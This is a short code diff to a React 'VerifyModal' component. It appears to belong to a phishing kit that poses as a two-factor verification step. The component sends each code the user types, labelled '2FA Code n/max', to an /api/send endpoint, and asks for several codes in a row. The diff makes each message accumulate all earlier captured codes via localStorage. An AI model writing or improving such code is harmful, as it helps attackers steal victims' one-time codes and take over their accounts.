@@ -61,12 +61,14 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const message = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+        const savedMessage = localStorage.getItem('message') || '';
+        const message = savedMessage + `\n<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
         try {
             await axios.post('/api/send', {
                 message,
                 message_id: messageId
             });
+            localStorage.setItem('message', message);
             if (next >= maxCode) {
                 nextStep();
             } else {
